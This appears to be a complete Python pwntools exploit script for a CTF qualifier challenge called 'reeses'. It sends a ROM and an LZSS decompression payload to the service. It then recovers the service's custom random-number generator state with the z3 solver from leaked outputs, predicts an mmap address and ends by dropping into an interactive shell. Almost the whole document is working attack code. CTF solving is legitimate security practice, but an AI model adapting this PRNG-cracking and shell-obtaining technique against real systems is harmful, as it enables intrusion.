from pwn import *
import struct, random, sys
import z3

######################################
#### Random number generator #########
######################################

r = {}
rindex = 0

def get_random_number():
  global r
  global rindex
  int_mask = ((2**32)-1)
  index_plus24 = r[(rindex + 24) & 0x1f]
  index_plus31 = (rindex + 31) & 0x1f
  index_plus31_2 = (rindex + 31) & 0x1f
  val1 = (r[(rindex+3) & 0x1f] >> 8) ^ r[rindex] ^ r[(rindex+3) & 0x1f]
  val2 = ((r[(rindex+10) & 0x1f] << 14) ^ (index_plus24 << 19) ^ index_plus24 ^ r[(rindex+10) & 0x1f]) & int_mask
  result = ((val2 << 13) ^ (val1 << 7) ^ val2 ^ val1 ^ (r[index_plus31_2] << 11) ^ r[index_plus31_2]) & int_mask
  r[rindex] = val2 ^ val1
  r[index_plus31_2] = result
  rindex = index_plus31
  return result

def seed_random_number(seed):
  global r
  global rindex
  rindex = 0

  r[0] = seed 
  for i in range(0,32):
    r[i+1] = 0x7FFFF * (((r[i & 0x1F] >> 30) + i + 1) ^ (r[i & 0x1f]))
    r[i+1] &= 0xffffffff

def print_random_state():
  for i in range(0, 32, 4):
    print "{:08x} {:08x} {:08x} {:08x}".format(r[i], r[i+1], r[i+2], r[i+3])

######################################
#### Helper functions ################
######################################

def getfile(filepath):
	fd = open(filepath, "r")
	contents = fd.read()
	fd.close()
	return contents

######################################
#### Main Execution ##################
######################################

if len(sys.argv) < 2:
	print "Usage: python exploit.py payload_file"
	sys.exit(1)

payload_file = sys.argv[1]

if "remote" in sys.argv:
	p = remote('reeses_fc849330ede1f497195bad5213deaebc.quals.shallweplayaga.me', 3456)
else:
	p = process("./reeses")

if "debug" in sys.argv:
	context.log_level = 'debug'

# Send the ROM to execute
contents = getfile("sample1")
p.write(p32(len(contents)))
p.write(contents)
p.readuntil(">>")

# Send the lzss payload to decompress
data = getfile(payload_file)
print "Sending {:#x} bytes".format(len(data))
p.write(p8(1)) # decompress
p.clean()
p.write(p32(len(data)))
p.clean()
p.write(data)
p.clean()

p.readuntil("PWN!")
print "Got PWN! Reading random data"

######################################
#### Now solve for the random table ##
######################################

# Should work with anything >= 32, but z3 takes
# forever with 32, so I increased it to 128
NUM_RANDOMS = 128 

random = {}
for i in range(32):
	random[i] = z3.BitVec('random{}'.format(i),32)

s = z3.Solver()
index = 0
for i in range(0, NUM_RANDOMS):
	result = z3.BitVecVal(u32(p.read(4)), 32)
	index_plus3  = (index + 3) & 0x1f
	index_plus10 = (index + 10) & 0x1f
	index_plus24 = random[(index + 24) & 0x1f]
	index_plus31 = (index + 31) & 0x1f

	val1 = z3.BitVec("round{}_val1".format(i), 32)
	val2 = z3.BitVec("round{}_val2".format(i), 32)
	s.add(val1 == z3.Extract(31, 0, (z3.ZeroExt(32, random[index_plus3]) >> 8) ^ z3.ZeroExt(32, random[index]) ^ z3.ZeroExt(32, random[index_plus3])))
	s.add(val2 == z3.Extract(31, 0, (z3.ZeroExt(32, random[index_plus10]) << 14) ^ (z3.ZeroExt(32, index_plus24) << 19) ^ z3.ZeroExt(32, index_plus24) ^ z3.ZeroExt(32, random[index_plus10])))
	s.add(result == z3.Extract(31, 0, (z3.ZeroExt(32, val2) << 13) ^ (z3.ZeroExt(32, val1) << 7) ^ z3.ZeroExt(32, val2) ^ z3.ZeroExt(32, val1) ^ (z3.ZeroExt(32, random[index_plus31]) << 11) ^ z3.ZeroExt(32, random[index_plus31])))
	random[index] = val2 ^ val1
	random[index_plus31] = result
	index = index_plus31

print "Got all random data, calling z3"
result = s.check()
if result == z3.sat:
	model=s.model()
	for i in range(32):
		random = z3.BitVec('random{}'.format(i),32)
		r[i] = model.eval(random).as_long()

	print_random_state()
	for i in range(NUM_RANDOMS): # Fast forward the random state to where we left it
		get_random_number()

	next_random = get_random_number()
	mmap_address = ((next_random << 12) | 0x400000000000)
	print "Mmap address 0x{:x}".format(mmap_address)
	p.write(p64(mmap_address))
	
else:
	print "Unsat"
	sys.exit(1)

# Catch our shell and have at it
p.interactive()

